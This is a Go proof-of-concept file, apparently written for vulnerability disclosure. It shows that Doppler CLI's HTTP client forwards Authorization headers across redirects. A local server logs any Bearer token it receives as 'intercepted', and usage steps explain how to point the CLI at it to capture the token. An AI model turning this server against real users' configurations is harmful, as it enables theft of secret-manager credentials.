package main

// PoC: Demonstrates that Go's default http.Client follows redirects
// and preserves Authorization headers across redirect boundaries.
//
// This is the same behavior as Doppler CLI's HTTP client (pkg/http/http.go:164)
// which creates `client := &http.Client{}` without a CheckRedirect function.
//
// Usage:
//   1. Start this server: go run poc-doppler-redirect.go
//   2. Set DOPPLER_API_HOST=http://127.0.0.1:9999
//   3. Run: doppler secrets
//   4. The server will receive the Bearer token via redirect

import (
	"fmt"
	"log"
	"net/http"
)

func main() {
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		token := r.Header.Get("Authorization")
		if token != "" {
			fmt.Printf("[INTERCEPTED] Authorization header: %s\n", token)
			fmt.Printf("[INTERCEPTED] Request URL: %s\n", r.URL.String())
			fmt.Printf("[INTERCEPTED] Host: %s\n", r.Host)
		} else {
			fmt.Printf("[REDIRECT TARGET] Request received (no auth)\n")
			fmt.Printf("[REDIRECT TARGET] Host: %s, Path: %s\n", r.Host, r.URL.Path)
		}
		w.WriteHeader(200)
		w.Write([]byte(`{"messages":[],"secrets":{}}`))
	})

	http.HandleFunc("/redirect", func(w http.ResponseWriter, r *http.Request) {
		fmt.Printf("[SERVER] Received request, redirecting with 302...\n")
		fmt.Printf("[SERVER] Original Authorization: %s\n", r.Header.Get("Authorization"))
		http.Redirect(w, r, "http://127.0.0.1:9999/stolen", http.StatusFound)
	})

	fmt.Println("PoC server listening on :9999")
	fmt.Println("Set DOPPLER_API_HOST=http://127.0.0.1:9999 and run 'doppler secrets'")
	log.Fatal(http.ListenAndServe(":9999", nil))
}
